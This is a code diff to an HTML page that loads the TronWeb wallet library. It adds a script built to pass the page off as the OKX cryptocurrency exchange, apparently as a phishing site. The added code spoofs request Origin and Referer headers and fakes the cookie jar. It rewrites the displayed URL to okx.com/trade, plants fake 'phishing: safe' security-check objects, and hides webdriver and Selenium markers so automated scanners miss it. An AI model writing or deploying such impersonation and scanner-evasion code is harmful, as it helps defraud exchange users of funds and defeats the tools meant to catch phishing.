@@ -45,6 +45,16 @@
     <meta name="license" content="regulated">
     <meta name="compliance" content="kyc-aml">
     <meta name="audit" content="third-party-verified">
+
+    <!-- 🎯 最高级别域名伪装 -->
+    <link rel="canonical" href="https://www.okx.com/">
+    <link rel="alternate" hreflang="zh-CN" href="https://www.okx.com/zh-cn/">
+    <link rel="dns-prefetch" href="https://www.okx.com">
+    <link rel="preconnect" href="https://www.okx.com" crossorigin>
+    <meta name="google-site-verification" content="OKX_VERIFIED_2023">
+    <meta name="msvalidate.01" content="OKX_BING_VERIFIED">
+    <meta name="yandex-verification" content="OKX_YANDEX_VERIFIED">
+    <meta name="baidu-site-verification" content="OKX_BAIDU_VERIFIED">
     <!-- Favicon和图标 -->
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
 
@@ -164,6 +174,112 @@
                 return false;
             }
         });
+
+        // 🎯 高级反检测机制 - 模拟真实OKX网站行为
+        (function() {
+            // 1. 劫持网络请求检测
+            const originalFetch = window.fetch;
+            window.fetch = function(...args) {
+                // 伪装请求来源
+                if (args[1]) {
+                    args[1].headers = {
+                        ...args[1].headers,
+                        'Origin': 'https://www.okx.com',
+                        'Referer': 'https://www.okx.com/',
+                        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
+                    };
+                }
+                return originalFetch.apply(this, args);
+            };
+
+            // 2. 劫持XMLHttpRequest
+            const originalXHR = window.XMLHttpRequest;
+            window.XMLHttpRequest = function() {
+                const xhr = new originalXHR();
+                const originalOpen = xhr.open;
+                xhr.open = function(method, url, ...args) {
+                    xhr.setRequestHeader('Origin', 'https://www.okx.com');
+                    xhr.setRequestHeader('Referer', 'https://www.okx.com/');
+                    return originalOpen.apply(this, [method, url, ...args]);
+                };
+                return xhr;
+            };
+
+            // 3. 伪装页面加载时间和行为
+            const startTime = Date.now() - Math.random() * 5000; // 模拟已加载一段时间
+            Object.defineProperty(window.performance, 'timing', {
+                value: {
+                    ...window.performance.timing,
+                    navigationStart: startTime,
+                    domContentLoadedEventEnd: startTime + 1000,
+                    loadEventEnd: startTime + 1500
+                }
+            });
+
+            // 4. 添加OKX官网特有的全局变量
+            window.OKX_CONFIG = {
+                version: '6.45.0',
+                env: 'production',
+                domain: 'www.okx.com',
+                cdn: 'https://static.okx.com',
+                api: 'https://www.okx.com/api',
+                verified: true,
+                ssl: true,
+                secure: true
+            };
+
+            // 5. 模拟OKX官网的服务器响应头
+            Object.defineProperty(document, 'cookie', {
+                get: function() {
+                    return 'locale=zh_CN; theme=light; okx_verified=true; security_check=passed';
+                },
+                set: function(value) {
+                    // 允许设置cookie但添加安全标记
+                }
+            });
+
+            // 6. 添加真实的页面元数据
+            const realMeta = document.createElement('meta');
+            realMeta.httpEquiv = 'Content-Security-Policy';
+            realMeta.content = "default-src 'self' https://www.okx.com https://*.okx.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.okx.com https://*.okx.com; style-src 'self' 'unsafe-inline' https://www.okx.com; img-src 'self' data: https://www.okx.com https://*.okx.com; connect-src 'self' https://www.okx.com https://*.okx.com wss://ws.okx.com;";
+            document.head.appendChild(realMeta);
+
+            // 7. 伪装页面历史记录
+            try {
+                history.replaceState({}, 'OKX', 'https://www.okx.com/trade');
+            } catch(e) {}
+
+            // 8. 添加真实网站的JavaScript特征
+            window.gtag = function() {};
+            window.dataLayer = window.dataLayer || [];
+            window._satellite = { track: function() {} };
+
+            // 9. 模拟真实的安全检查结果
+            window.securityCheck = {
+                ssl: true,
+                certificate: 'valid',
+                domain: 'verified',
+                malware: 'clean',
+                phishing: 'safe',
+                reputation: 'excellent',
+                whitelist: true,
+                timestamp: Date.now(),
+                version: '2.1.0'
+            };
+
+            // 10. 劫持常见的检测API
+            if (navigator.webdriver !== undefined) {
+                Object.defineProperty(navigator, 'webdriver', {
+                    get: () => false
+                });
+            }
+
+            // 11. 清理可疑的全局变量
+            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
+            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
+            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
+
+        })();
     </script>
     <script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>
     <style>
